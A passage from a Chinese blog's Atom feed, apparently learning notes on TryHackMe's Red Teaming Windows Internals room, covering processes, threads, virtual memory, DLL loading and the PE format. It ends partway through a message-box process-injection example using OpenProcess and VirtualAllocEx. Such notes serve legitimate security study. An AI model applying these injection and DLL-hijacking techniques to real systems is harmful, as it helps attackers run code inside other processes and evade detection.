<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Recopec 的博客</title>
  
  
  <link href="https://blog.irec.moe/atom.xml" rel="self"/>
  
  <link href="https://blog.irec.moe/"/>
  <updated>2025-08-30T00:34:57.000Z</updated>
  <id>https://blog.irec.moe/</id>
  
  <author>
    <name>Recopec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Try Hack Me - Red Teaming</title>
    <link href="https://blog.irec.moe/thm_rthe.html"/>
    <id>https://blog.irec.moe/thm_rthe.html</id>
    <published>2025-08-29T16:00:00.000Z</published>
    <updated>2025-08-30T00:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是 TryHackMe Red Teaming Path 的 Host Evasions 部分，因为我是从 JR -&gt; WAP -&gt; Offensive Pentesting 这样学过来的，所以前面的很多房间学完了，AD 也在 OP 里面学完了，所以就这一部分没学。</p><p>全都是 Windows 相关的知识，学起来挺费劲的，对于从来没有接触过 C# 的我来说有点懵逼，特别是 Windows 那些非托管代码的用法一个都不知道，从来没有接触过 Windows 开发，不过还好，房间讲的很细，同时也要靠自己的主观性去搜不懂的有疑问的知识点，网上资源很多。我学习的过程中并不是仅限于房间内的资源，还会拓展很多的。</p><p>还是和 Offensive Pentesting 一样，建议这篇文章作为官方 WP 的补充来阅读。</p><h1 id="Windows-Internals"><a href="#Windows-Internals" class="headerlink" title="Windows Internals"></a>Windows Internals</h1><p>这个房间主要介绍了有关进程，可执行文件相关的东西，大体是让我们掌握这些的概念，不至于懵懵懂懂，相对来说还是挺好理解的。</p><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><p>一个应用程序包含多个进程，一个进程又由多个组件组成。<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads">文档</a>把这些组件分解为每个进程提供执行程序所需要的资源。</p><p>进程是通过执行应用程序创建的，Windows 的大部分功能都可以视为一个应用程序，拥有相应的进程。攻击者可以利用这些合法的进程进行攻击，以逃避检测。以下是一些进程攻击方法：</p><ul><li>Process Injection（进程注入） (<a href="https://attack.mitre.org/techniques/T1055/">T1055</a>)</li><li>Process Hollowing（进程镂空） (<a href="https://attack.mitre.org/techniques/T1055/012/">T1055.012</a>)</li><li>Process Masquerading（进程伪装） (<a href="https://attack.mitre.org/techniques/T1055/013/">T1055.013</a>)</li></ul><p>一个进程具有虚拟地址空间、可执行代码、打开系统对象的句柄、安全上下文、唯一的进程标识符、环境变量、优先级类、最小和最大工作集大小，以及至少一个执行线程。</p><table><thead><tr><th>进程组件</th><th>作用</th></tr></thead><tbody><tr><td>私有虚拟内存空间</td><td>分配给进程的虚拟内存地址</td></tr><tr><td>可执行程序</td><td>定义存储在虚拟内存空间中的代码和数据</td></tr><tr><td>打开的句柄</td><td>定义进程可访问的系统资源的句柄</td></tr><tr><td>安全上下文</td><td>访问令牌定义了用户， 安全组，权限和其他安全信息</td></tr><tr><td>进程 ID</td><td>每个进程独有的数字标识符</td></tr><tr><td>线程</td><td>进程计划执行的部分</td></tr></tbody></table><p>我们也可以在较低的层面上解释一个进程，因为它驻留在虚拟地址空间中。下表和图表描述了进程在内存中的样子。</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>代码</td><td>将要被进程执行的代码</td></tr><tr><td>全局变量</td><td>存储的变量</td></tr><tr><td>进程堆</td><td>定义存储数据的堆</td></tr><tr><td>进程资源</td><td>定义进程未来的资源</td></tr><tr><td>环境块</td><td>定义线程信息的数据结构</td></tr></tbody></table><img src="/thm_rthe/66320022b6b57f3c40e135d66de3c1d9.png" class="" title="img"><p>这些信息说实话有点抽象了，但是我们能用任务管理器观察到他们实际的存在。这些数据是用户和攻击者最常操纵的内容。</p><table><thead><tr><th>**Value&#x2F;Component **</th><th>**Purpose **</th><th><strong>Example</strong></th></tr></thead><tbody><tr><td>名称</td><td>定义进程的名字，一般是进程 exe 的 名字</td><td>conhost.exe</td></tr><tr><td>PID</td><td>每个进程独有的数字标识符</td><td>7408</td></tr><tr><td>状态</td><td>进程的运行状态（运行中，暂停等）</td><td>Running</td></tr><tr><td>用户名</td><td>启动进程的用户，代表进程拥有的权限</td><td>SYSTEM</td></tr></tbody></table><p>这里的问题就问了一些进程的 PID 相关，还有一个进程的完整性级别，之前做 Windows AD 里面碰到过。</p><h2 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h2><p>线程是进程的一个可执行单元，线程与其父进程共享相同的详细信息和资源，例如代码、全局变量等。线程也有其独特的数值和数据，如下表所示。</p><table><thead><tr><th><strong>Component</strong></th><th><strong>Purpose</strong></th></tr></thead><tbody><tr><td>栈</td><td>线程相关的所有数据（异常，过程调用等）</td></tr><tr><td>线程局部存储</td><td>分配独立数据环境的储存空间的指针</td></tr><tr><td>栈参数</td><td>每个线程分配的独立的值</td></tr><tr><td>上下文结构</td><td>保存内核维护的机器寄存器的值</td></tr></tbody></table><p>题目这里说实话把我绕住了，首先第一问问的是 notepad.exe <strong>创建时</strong>，操作系统为它<strong>自动生成的第一个线程的唯一 ID</strong> 是什么。第二问是前一个线程的栈参数是什么，其实答案是是哪个线程 ID 创建了接下来的 notepad.exe。</p><h2 id="Virtual-memory"><a href="#Virtual-memory" class="headerlink" title="Virtual memory"></a>Virtual memory</h2><p>虚拟内存为每个进程提供一个<a href="https://docs.microsoft.com/en-us/windows/win32/memory/virtual-address-space">私有虚拟内存空间</a>。内存管理器用来将虚拟内存地址映射到物理地址的。拥有虚拟内存空间可以不直接写入物理内存，这样进程就减小碰撞风险了。内存管理器使用的是<strong>页</strong>来传输内存。所以应用程序用的虚拟内存可能会多于实际的物理内存。同时还会将页面虚拟内存移到磁盘（SWAP），以解决内存不够用的问题，提升系统效率，下图是示例。</p><img src="/thm_rthe/49fb3abea645c7c5850ce3c83981fe76.png" class="" title="img"><p>32 位系统理论虚拟地址空间极限是 4GB。这个地址空间被一分为二，下半部分（<em>0x00000000 - 0x7FFFFFFF</em>）所述分配给进程。上半部分（<em>0x80000000 - 0xFFFFFFFF</em>）分配给操作系统内存使用。管理员可以设置 (<em>increaseUserVA</em>) 或者 <a href="https://docs.microsoft.com/en-us/windows/win32/memory/address-windowing-extensions">AWE (<strong>A</strong>ddress <strong>W</strong>indowing <strong>E</strong>xtensions)</a> 来解决需要更大地址空间的应用程序。64 位系统的理论极限是 256TB。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png" alt="img" data-caption="img" loading="lazy"></p><p>可以看看 Windows XP，还有 Windows Server 2003 那些开启 4G 内存支持的文章。小时候自己也折腾过，开了一个 PAE，然后把没用到的内存开一个虚拟磁盘，然后在那个虚拟盘上开一个 SWAP。</p><h2 id="Dynamic-Link-Libraries"><a href="#Dynamic-Link-Libraries" class="headerlink" title="Dynamic Link Libraries"></a>Dynamic Link Libraries</h2><p>这一节就是讲动态链接库了，和后面的几个房间都相关。</p><p>官方文档：<a href="https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library">What is a DLL</a></p><p>DLL 在我看来和 JavaScript Python 那些包的概念类似，它们实现了代码重用和模块化。不过 DLL 是编译好的，当然语言类型不同这些也应该不一样。</p><p>DLL 作为一个程序中所要用到的函数被加载，因为这个程序依赖 DLL，攻击者就可以针对 DLL 而不是应用程序本身来攻击，相当于把这个方法劫持了，以下是 MTIRE 攻击向量：</p><ul><li>DLL Hijacking（DLL 劫持） (<a href="https://attack.mitre.org/techniques/T1574/001/">T1574.001</a>)</li><li>DLL Side-Loading（DLL 侧载） (<a href="https://attack.mitre.org/techniques/T1574/002/">T1574.002</a>)</li><li>DLL Injection（DLL 注入） (<a href="https://attack.mitre.org/techniques/T1055/001/">T1055.001</a>)</li></ul><p>新版 QQ 使用 betterqqnt 那种方法我觉得应该是 DLL 劫持，因为他把恶意的 <code>dbghelp.dll</code> 文件丢到那个目录下，然后程序默认就会运行并且执行这个 DLL 里面的方法（我猜的）。</p><p>DLL 的创建与任何其他项目&#x2F;应用程序并无不同；它们只需要稍作语法修改即可工作。下面是来自 <em>Visual C++ Win32 动态链接库项目</em> 的一个 DLL 示例。</p><figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;stdafx.h&quot;</span></span><span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">EXPORTING_DLL</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;sampleDLL.h&quot;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这个函数是每个 DLL 文件必须包含的入口点函数，他是由 Windows 操作系统自动调用</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// hModule (DLL 的句柄)：操作系统告诉 DLL “这就是你自己的身份令牌”。DLL 可以用这个令牌来找到自己的位置，或者在需要时加载自己内部的资源。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// ul_reason_for_call (被调用的原因)：操作系统告诉 DLL “我找你是因为一个新进程加载了你”，或者“一个线程正在退出，所以你需要做一些清理工作”。DLL 可以根据这个参数来决定它应该执行什么代码。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// lpReserved (保留参数)：操作系统告诉 DLL “这个参数暂时不用，但将来可能会用，请不要动它”。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// DWORD = unsigned long</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//</span></span><span class="line"><span style="color: #ABB2BF">BOOL APIENTRY </span><span style="color: #61AFEF">DllMain</span><span style="color: #ABB2BF">( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved</span></span><span class="line"><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 这段代码中 DLLMain 没有执行任何参数，只是返回 TRUE，意味着他在 DLL 加载和卸载的时候不做任何初始化和清理工作</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> TRUE;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MessageBox</span><span style="color: #ABB2BF">( </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">TEXT</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Hello World&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #61AFEF">TEXT</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;In a DLL&quot;</span><span style="color: #ABB2BF">), MB_OK);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="DWORD-ul-reason-for-call"><a href="#DWORD-ul-reason-for-call" class="headerlink" title="DWORD ul_reason_for_call"></a>DWORD ul_reason_for_call</h3><ul><li><code>1</code> (或 <code>DLL_PROCESS_ATTACH</code>)：DLL 刚刚被一个新进程加载。</li><li><code>2</code> (或 <code>DLL_THREAD_ATTACH</code>)：DLL 所在的进程里创建了一个新线程。</li><li><code>3</code> (或 <code>DLL_THREAD_DETACH</code>)：DLL 所在的进程里有一个线程退出了。</li><li><code>0</code> (或 <code>DLL_PROCESS_DETACH</code>)：DLL 即将被进程卸载。</li></ul><p>下面是该 DLL 的头文件，通常会保存在一个名为 <code>sampleDLL.h</code> 的头文件中，并被其他源代码文件引用。它将定义导入和导出的函数。</p><figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#ifndef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">INDLL_H</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">INDLL_H</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">#ifdef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">EXPORTING_DLL</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> __declspec(dllexport) </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #C678DD">    #else</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> __declspec(dllimport) </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #C678DD">    #endif</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">#endif</span></span></code></pre></div></div></figure><h3 id="加载-DLL"><a href="#加载-DLL" class="headerlink" title="加载 DLL"></a>加载 DLL</h3><p>DLL 可以使用<strong>加载时动态链接</strong>或<strong>运行时动态链接</strong>加载到程序中。</p><h4 id="加载时动态链接-load-time-dynamic-linking"><a href="#加载时动态链接-load-time-dynamic-linking" class="headerlink" title="加载时动态链接 load-time dynamic linking"></a>加载时动态链接 load-time dynamic linking</h4><p>当使用<strong>加载时动态链接</strong>加载时，应用程序会显式调用 DLL 函数。只有通过提供头文件 <code>.h</code> 和导入库文件 <code>.lib</code> 才能实现这种类型的链接。下面是一个从应用程序调用导出的 DLL 函数的示例。</p><figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;stdafx.h&quot;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这里显式的导入了我们的文件</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;sampleDLL.h&quot;</span></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> APIENTRY </span><span style="color: #61AFEF">WinMain</span><span style="color: #ABB2BF">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> nCmdShow)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h4 id="运行时动态链接-run-time-dynamic-linking"><a href="#运行时动态链接-run-time-dynamic-linking" class="headerlink" title="运行时动态链接 run-time dynamic linking"></a>运行时动态链接 run-time dynamic linking</h4><p>当使用<strong>运行时动态链接</strong>加载时，会使用一个单独的函数（<code>LoadLibrary</code> 或 <code>LoadLibraryEx</code>）在运行时加载 DLL。加载后，你需要使用<code>GetProcAddress</code> 来识别要调用的导出的 DLL 函数。下面是一个在应用程序中加载和导入 DLL 函数的示例。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这行代码定义了一个新的函数指针类型，名为 DLLPROC。这个类型的函数指针不返回任何值（VOID），并且接受一个字符串参数（LPTSTR）</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">VOID</span><span style="color: #ABB2BF"> (*</span><span style="color: #E06C75">DLLPROC</span><span style="color: #ABB2BF">) (</span><span style="color: #E5C07B">LPTSTR</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这行声明了一个名为 HelloWorld 的函数指针变量，它的类型是我们上面定义的 DLLPROC</span></span><span class="line"><span style="color: #ABB2BF">DLLPROC HelloWorld;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// HINSTANCE 是一个句柄类型，用于存储加载的 DLL 模块的实例句柄。它代表了 DLL 在内存中的位置</span></span><span class="line"><span style="color: #ABB2BF">HINSTANCE hinstDLL;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 一个布尔变量，用于存储 FreeLibrary 函数的返回值，以检查操作是否成功</span></span><span class="line"><span style="color: #ABB2BF">BOOL fFreeDLL;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 加载 DLL，如果成功加载，会返回一个模块句柄给 hinstDLL，失败返回 NULL</span></span><span class="line"><span style="color: #ABB2BF">hinstDLL </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibrary</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sampleDLL.dll&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hinstDLL </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 它在已经加载的 DLL 模块中查找并返回 HelloWorld 的内存地址。</span></span><span class="line"><span style="color: #ABB2BF">    HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (HelloWorld </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 调用函数指针的。它执行 HelloWorld 指针所指向的代码，也就是 sampleDLL.dll 中的 HelloWorld 函数</span></span><span class="line"><span style="color: #ABB2BF">        (HelloWorld);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 释放 DLL</span></span><span class="line"><span style="color: #ABB2BF">    fFreeDLL </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FreeLibrary</span><span style="color: #ABB2BF">(hinstDLL);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">...</span></span></code></pre></div></div></figure><p>TBH，这个代码把我绕了一会才看懂，如果没有 C 基础的话很坐牢的，不过梳理了一下把指针又复习了一遍就解决了，就拿上面代码中的这几行来解释：</p><figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 这里是定义一个名字叫 DLLPROC 的“函数指针类型”</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">VOID</span><span style="color: #ABB2BF"> (*</span><span style="color: #E06C75">DLLPROC</span><span style="color: #ABB2BF">) (</span><span style="color: #E5C07B">LPTSTR</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 原代码</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这里是执行一个强制转换的功能</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 将一个通用指针的类型，安全地转换为一个特定的（DLLPROC）函数指针类型。</span></span><span class="line"><span style="color: #ABB2BF">HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 第一种</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 编译器会抛出一个错误，告诉你“不能将一个地址解引用（dereference）为 DLLPROC 类型。”</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这里的 * 试图解引用这个地址，尝试读取这个地址中的“值”</span></span><span class="line"><span style="color: #ABB2BF">HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 第二种</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 不能在类型转换的括号里使用 * 符号</span></span><span class="line"><span style="color: #ABB2BF">HelloWorld </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">DLLPROC) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hinstDLL, </span><span style="color: #98C379">&quot;HelloWorld&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>在恶意代码中，通常会更多地使用运行时动态链接，而非加载时动态链接，但是具体的加载时动态链接案例没讲。</p><h2 id="Portable-Executable-Format"><a href="#Portable-Executable-Format" class="headerlink" title="Portable Executable Format"></a>Portable Executable Format</h2><p>PE（Portable Executable，可移植可执行文件）格式是可执行文件和对象文件的总体结构。PE 和 COFF（Common Object File Format，通用对象文件格式）文件构成了 PE 格式。</p><img src="/thm_rthe/a2e6d40803c1d01beedd6e821de2e8d6.png" class="" title="img"><p>PE 数据的结构的解释如下：</p><ol><li><p><strong>DOS 头部</strong> 定义了文件的类型，<code>MZ</code> DOS 头将文件格式定义为 <code>.exe</code>。</p><ol><li>**DOS Stub **是文件开头默认运行的一个程序，它会打印一条兼容性消息。这对于大多数用户来说不会影响文件的任何功能。当文件在旧的 DOS 系统中运行时，这个小程序会执行并打印那条经典的“This program cannot be run in DOS mode.”（本程序不能在 DOS 模式下运行）消息。在现代 Windows 系统中，这一部分会被忽略。</li></ol></li><li><p><strong>PE 头部（PE Header）</strong>也叫 NT 头 <code>IMAGE_NT_HEADERS</code></p><ol><li><strong>PE 签名</strong>是一个固定的 DWORD 值 <code>0x50450000</code>（即 “PE\0\0”），用于正式标识文件为 PE 格式。</li><li><strong>文件头（File Header）</strong>提供了二进制文件的 PE 头信息，它定义了文件的格式，包含签名和镜像文件头，目标机器类型（32 位还是 64 位）、节的数量、时间戳等。</li><li><strong>可选文件头（Optional Header）</strong>的名称具有欺骗性，它是 <strong>PE 文件头</strong>的重要组成部分。它包含了加载器所需的最重要信息，比如程序入口点、代码和数据的基址等。<ol><li><strong>数据目录（Data Directories）</strong>它是可选文件头的一部分，是一个数组，数组中的每个条目都指向一个重要的数据结构，比如导入表、导出表、资源表等。</li></ol></li></ol></li><li><p><strong>节头部表（Section Header）</strong>提供了每个节的元数据，比如名称、在文件中的位置、在内存中的位置、大小和权限等。</p></li><li><p><strong>节（Sections）</strong>是文件的<strong>实际内容</strong>。每个节都有不同的作用和权限。</p><table><thead><tr><th><strong>部分</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>.text</td><td>包含可执行代码和入口点</td></tr><tr><td>.data</td><td>包含已初始化数据（字符串、变量等）。</td></tr><tr><td>.rdata or .idata</td><td>包含导入（Windows API）和 DLL。</td></tr><tr><td>.reloc</td><td>包含重定位信息</td></tr><tr><td>.rsrc</td><td>包含应用程序资源（图像等）</td></tr><tr><td>.debug</td><td>包含调试信息</td></tr></tbody></table></li></ol><p>一个 <code>.exe</code> 文件是由 <strong>DOS 头 + PE 头 + 节</strong>组成的，一个标准的 PE 文件在内存中的布局是这样的：</p><ol><li><strong>DOS 头</strong> (<code>IMAGE_DOS_HEADER</code>)</li><li><strong>DOS 存根</strong> (<code>DOS Stub</code>)</li><li><strong>PE 签名</strong> (<code>PE\0\0</code>)</li><li><strong>NT 头</strong> (<code>IMAGE_NT_HEADERS</code>)</li><li><strong>节头列表</strong> (<code>IMAGE_SECTION_HEADER</code> 数组)</li><li><strong>节内容</strong> (<code>.text</code>, <code>.data</code> 等)</li></ol><p>想要了解更多可以看看这个文章：<a href="https://www.freebuf.com/articles/system/288382.html">PE文件结构解析</a></p><h2 id="Interacting-with-Windows-Internals"><a href="#Interacting-with-Windows-Internals" class="headerlink" title="Interacting with Windows Internals"></a>Interacting with Windows Internals</h2><p>这一节就是讲 Windows API 这些了，然后说了一下用户态和内核态这些。</p><p>大多数 Windows 内部组件都需要与物理硬件和内存交互，应用程序默认情况下通常无法与内核交互或修改物理硬件，并且需要一个接口实现这些。</p><table><thead><tr><th><strong>User mode</strong></th><th><strong>Kernel Mode</strong></th></tr></thead><tbody><tr><td>无法直接访问硬件</td><td>直接访问硬件</td></tr><tr><td>在私有虚拟地址空间中创建进程</td><td>在单个共享虚拟地址空间中运行</td></tr><tr><td>访问“已拥有内存位置”</td><td>访问整个物理内存</td></tr></tbody></table><p>在用户模式或 “userspace” 中启动的应用程序将保持在该模式。当应用程序需要执行一个只有内核才能完成的操作时（例如：读写文件、创建新进程、网络通信等），它会发出一个系统调用请求，这个系统调用就是那个“切换点”的触发器。具体流程参考下图。</p><img src="/thm_rthe/2e5b0c2fccd102d477752270054facb2.png" class="" title="img"><p>当 C# 这样的语言想要调用 Win32 API 时，它不会直接调用。它的代码会先被 CLR（Common Language Runtime）接管。<strong>CLR</strong> 会负责将中间代码翻译成机器码，并且在必要的时候，<strong>由 CLR 去调用底层的 Win32 API 来与操作系统交互</strong>。</p><p>所以，这个过程可以看作是一个“间接”调用：<strong>你的 C# 代码 → CLR → Win32 API → 操作系统</strong></p><p>而不是：<strong>你的 C# 代码 → Win32 API → 操作系统</strong></p><p>CLR 类似 Java Runtime 这样的东西，他也是提供了一个运行时，提供了自动垃圾回收、类型安全检查等功能。</p><h3 id="注入弹窗到进程中"><a href="#注入弹窗到进程中" class="headerlink" title="注入弹窗到进程中"></a>注入弹窗到进程中</h3><p>我们将把一个消息框注入到本地进程中，以演示与内存交互的 PoC，将消息框写入内存的步骤如下所述：</p><ol><li>为消息框分配本地进程内存。</li><li>将消息框写入&#x2F;复制到已分配的内存中。</li><li>从本地进程内存执行消息框。</li></ol><p>第一步，我们可以使用 <code>OpenProcess</code> 获取指定进程的句柄。</p><figure class="shiki C++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre><code>// 获取一个进程的句柄HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, // 定义访问的权限FALSE, // 目标句柄不可被继承，我们创建的子程序不带权限DWORD(atoi(argv[1])) // 读取用户在命令行输入的进程号，转为 int);</code></pre></div></div></figure><p>第二步，我们可以使用 <code>VirtualAllocEx</code> 分配一个带有有效载荷缓冲区的内存区域。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// VirtualAllocEx 在指定进程中分配、预留或释放内存</span></span><span class="line"><span style="color: #7F848E; 